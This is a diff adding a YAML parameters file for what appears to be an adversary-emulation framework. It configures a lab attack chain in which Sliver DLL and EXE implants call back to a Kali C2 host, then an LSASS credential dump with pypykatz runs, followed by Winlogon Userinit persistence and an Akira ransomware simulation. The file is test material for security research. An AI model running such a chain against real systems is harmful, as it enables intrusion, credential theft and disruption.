@@ -1,0 +1,125 @@
+# Aurora attack-chain parameters file — 20260715T033724Z/chain-003
+#                                        (verification pick #1)
+#
+# Chain narrative (12 steps, DOUBLE-PAYLOAD Sliver chain):
+#   Sliver DLL payload → victim downloads DLL → victim runs
+#   `regsvr32 <DLL>` (non-elev, DLL side-load loads sliver stub) →
+#   Sliver session 1 (medium) → whoami discovery → Sliver EXE
+#   payload (a SECOND independent payload — this chain builds two
+#   distinct implants) → victim downloads and runs EXE AS ADMIN →
+#   Sliver session 2 (elevated) → derive PS from elevated Sliver →
+#   pypykatz LSASS dump (T1003.002 — Python-based Mimikatz clone,
+#   auto-installs its own venv on target if absent) → winlogon-
+#   userinit persistence (T1547.001 — appends payload to HKLM
+#   Winlogon\Userinit, fires at every login for ALL users) →
+#   AKIRA ransomware simulation (T1486 — writes 20 random-content
+#   .akira files + drops ransom note on desktop).
+#
+#   VERIFICATION VALUE — three unique axes:
+#     • sliver-payload-windows-DLL family (build + regsvr32 side-
+#       load + callback → sliver session) — first DLL C2 stage in
+#       any verified chain
+#     • art-t1547_001-winlogon-userinit persistence — highest-risk
+#       persistence in the art-v2 set (persists across reboots for
+#       ALL users, harder to detect/remove than Run keys)
+#     • art-t1486-akira-ransomware-sim impact — T1486 Data Encrypted
+#       for Impact, the "loudest" impact in the covered set
+#
+# Attacker: Kali at 192.168.56.43 with sliver-server running
+#           (single mtls listener on 8443 catches both DLL and EXE
+#           implant callbacks — they're separate implants but the
+#           listener is protocol-based, not binary-based)
+# Victim:   Windows Server 2022 VM, RDP as useradmin (medium-integrity
+#           split token, admin group, NOT built-in Administrator)
+#
+# ⚠ THREE KNOWN-RISKY STEPS ⚠ — see per-step notes below
+#   Step 10 (pypykatz): auto-installs Python + pypykatz. Multiple
+#           failure modes (network / Defender / LSASS PPL). Documented.
+#   Step 11 (winlogon-userinit): modifies system-wide login behavior.
+#           Post-pilot MUST revert to keep future logins clean.
+#   Step 12 (akira sim): writes 20 files with `.akira` extension.
+#           Defender likely to flag / quarantine — pilot may show
+#           partial writes. Cleanup: rm *.akira from output_dir.
+
+pddl_bindings:
+  # used by: 1_sliver-payload-windows-dll.SAVE_PATH
+  # Attacker-side path where sliver writes the DLL implant.
+  string0_var_in_plan: /home/kali/Desktop/Aurora-executor-demo/sliver_save/chain_sl.dll
+
+  # used by: 2_simulate-download-file.SAVE_PATH,
+  #          3_simulate-execute-dll-windows.DLL_PATH
+  # Victim-side landing path for the DLL — downloaded at step 2,
+  # side-loaded via `regsvr32 <path>` at step 3 to establish
+  # non-elev Sliver session.
+  string4_var_in_plan: C:\Users\Public\chain_sl.dll
+
+  # used by: 6_sliver-payload-windows-exe.SAVE_PATH
+  # Attacker-side path for the SECOND payload (Sliver EXE). Distinct
+  # binary from the DLL — the chain deliberately builds two implants
+  # to demonstrate "same C2, different initial-access vector".
+  string1_var_in_plan: /home/kali/Desktop/Aurora-executor-demo/sliver_save/chain_sl2.exe
+
+  # used by: 7_simulate-download-execute-file-root.SAVE_PATH
+  # Victim-side landing path for the EXE — downloaded and run
+  # AS ADMIN at step 7 to establish the elevated Sliver session.
+  string2_var_in_plan: C:\Users\Public\chain_sl2.exe
+
+  # used by: 11_art-t1547_001-winlogon-userinit.payload
+  # Program appended to HKLM Winlogon\Userinit — fires at EVERY
+  # login for ALL users. MUST be a benign program for pilot;
+  # anything broken would leave the target unable to boot cleanly.
+  # notepad.exe pops a notepad window at each login (harmless,
+  # visually verifiable). Post-pilot REVERT (see cleanup below).
+  string3_var_in_plan: C:\Windows\System32\notepad.exe
+
+steps:
+  "1_sliver-payload-windows-dll":
+    LHOST: 192.168.56.43       # attacker IP baked into DLL implant
+    LPORT: 8443                # sliver mtls listener port
+
+  "2_simulate-download-file":
+    LHOST: 192.168.56.43
+    LPORT: 8000                # HTTP server on Kali serving sliver_save/
+
+  "6_sliver-payload-windows-exe":
+    LHOST: 192.168.56.43       # SAME listener as DLL — mtls implant
+    LPORT: 8443                # protocol,  a single listener catches
+                               # both callbacks as separate sessions
+
+  "7_simulate-download-execute-file-root":
+    LHOST: 192.168.56.43
+    LPORT: 8000                # SAME HTTP server as step 2 —
+                               # sliver_save/ now contains BOTH
+                               # chain_sl.dll and chain_sl2.exe;
+                               # operator navigates to chain_sl2.exe
+
+  "10_art-t1003_002-pypykatz-live-lsa":
+    venv_path: 'C:\Users\Public\venv_pypykatz'
+    # ⚠ STEP 10 FAILURE MODES ⚠
+    #   • Auto-installs Python 3.10.4 (25MB) via
+    #     https://www.python.org/ftp/... — needs internet
+    #   • Then `pip install pypykatz` — needs pypi reachable
+    #   • Defender may flag pypykatz install / execution
+    #     (well-known LSASS-reading tool, has signatures)
+    #   • Server 2022 default has RunAsPPL=1 (LSA Protection) —
+    #     pypykatz cannot read protected LSASS
+    # Any of these fails → step 10 ✗ (like chain-005 gsecdump-lsass).
+    # NOT a chain-defect; documented uncertainty. Steps 11-12 still
+    # run after (chain progresses on step failure).
+
+  "12_art-t1486-akira-ransomware-sim":
+    file_count: 20             # reduce from ART default 100 for
+                               # faster pilot; still creates a
+                               # meaningful "ransomware footprint"
+                               # (20MB of .akira files, plus the
+                               # ransom note on desktop)
+    output_dir: 'C:\Users\Public'
+    ransom_note_name: 'akira_readme.txt'
+    # ⚠ STEP 12 FAILURE MODE ⚠
+    #   Defender's real-time protection may flag either the file
+    #   pattern (random content + `.akira` extension mimics real
+    #   AKIRA ransomware) or the ransom-note behavior. Partial
+    #   writes possible before Defender quarantines. Step marks ✓
+    #   as long as the PowerShell script exits successfully —
+    #   even if Defender deleted some files mid-write, the loop
+    #   catches its own exceptions.
